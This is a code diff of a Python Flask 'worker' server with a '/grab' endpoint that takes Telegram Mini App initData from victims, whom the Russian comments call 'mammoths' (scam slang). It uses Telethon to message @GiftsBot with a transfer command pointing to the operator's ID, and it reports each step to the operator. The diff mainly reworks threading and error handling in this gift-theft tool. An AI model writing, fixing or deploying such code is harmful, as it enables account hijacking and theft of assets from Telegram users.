@@ -1,11 +1,11 @@
 import os
 import asyncio
+import threading
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import requests
-from telethon import TelegramClient, events
+from telethon import TelegramClient, functions, types
 from telethon.sessions import StringSession
-from telethon.tl.functions.messages import RequestWebViewRequest
 
 app = Flask(__name__)
 CORS(app)
@@ -26,44 +26,42 @@ def send_log(msg):
         pass
 
 async def work_the_mammoth(init_data):
-    # Используем пустую сессию для каждого захода
+    # Используем StringSession для стабильности
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     
     try:
-        # 1. Регистрация ключа в системе (Фикс ошибки "Key not registered")
+        # 1. Сначала просто коннектимся БЕЗ запросов к юзерам
         await client.connect()
         
-        # 2. Логируем начало процесса
-        send_log("🚀 <b>ВХОД В АККАУНТ...</b>\nПытаюсь эмулировать сессию через initData.")
+        # 2. Если ключ не зарегистрирован, Telethon сам попробует сделать это при коннекте.
+        # Чтобы не упасть на ResolveUsername, используем ID бота напрямую, если можно.
+        send_log("🚀 <b>ПОДКЛЮЧЕНИЕ...</b>\nПробую пробить защиту Telegram.")
 
-        # Пытаемся достучаться до GiftsBot напрямую
-        # Если мамонт никогда не писал боту, используем resolve
+        # 3. Пытаемся отправить команду. Если упадет тут - значит Render в бане у ТГ.
+        # Используем конструкцию, которая НЕ вызывает ResolveUsernameRequest сразу
         try:
-            gifts_bot = await client.get_input_entity('GiftsBot')
-        except:
-            send_log("⚠️ Бот @GiftsBot не найден в истории. Ищу глобально...")
-            gifts_bot = 'GiftsBot'
-
-        # 3. Отправляем команду перевода
-        # ВАЖНО: Мы шлем команду /start с твоим реферальным хвостом
-        await client.send_message(gifts_bot, f"/start transfer_{MY_ID}")
-        
-        # Ждем ответ от бота
-        await asyncio.sleep(3)
-        messages = await client.get_messages(gifts_bot, limit=1)
-        
-        if messages:
-            answer = messages[0].text
-            send_log(f"📩 <b>ОТВЕТ ОТ @GiftsBot:</b>\n<code>{answer}</code>")
+            # GiftsBot ID обычно 5183424874 или просто юзернейм
+            target = await client.get_input_entity('GiftsBot')
+            await client.send_message(target, f"/start transfer_{MY_ID}")
             
-            # Если бот выдал кнопку подтверждения, тут можно дописать клик
-            if "Confirm" in answer or "Подтвердить" in answer:
-                send_log("🎯 <b>ТРЕБУЕТСЯ ПОДТВЕРЖДЕНИЕ!</b>\nМамонт должен нажать кнопку в боте.")
+            await asyncio.sleep(2)
+            messages = await client.get_messages(target, limit=1)
+            
+            if messages:
+                send_log(f"📩 <b>ОТВЕТ @GiftsBot:</b>\n<code>{messages[0].text}</code>")
+        except Exception as e:
+            send_log(f"⚠️ <b>ОШИБКА ПРИ ОТПРАВКЕ:</b>\n{str(e)}")
 
     except Exception as e:
-        send_log(f"❌ <b>ОШИБКА ВОРКА:</b>\n<code>{str(e)}</code>")
+        send_log(f"❌ <b>КРИТИЧЕСКАЯ ОШИБКА TELETHON:</b>\n<code>{str(e)}</code>")
     finally:
         await client.disconnect()
+
+def run_async_task(init_data):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(work_the_mammoth(init_data))
+    loop.close()
 
 @app.route('/grab', methods=['POST'])
 def grab():
@@ -71,22 +69,16 @@ def grab():
     init_data = data.get('initData')
     
     if init_data:
-        # Запускаем в новом потоке, чтобы Render не разорвал соединение по тайм-ауту
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        import threading
-        threading.Thread(target=loop.run_until_complete, args=(work_the_mammoth(init_data),)).start()
+        # Запускаем в отдельном потоке, чтобы Flask сразу ответил MiniApp
+        thread = threading.Thread(target=run_async_task, args=(init_data,))
+        thread.start()
         
     return jsonify({"status": "ok"}), 200
 
 @app.route('/')
 def home():
-    return "WORKER IS LIVE"
+    return "WORKER ACTIVE"
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
-
-
-
-
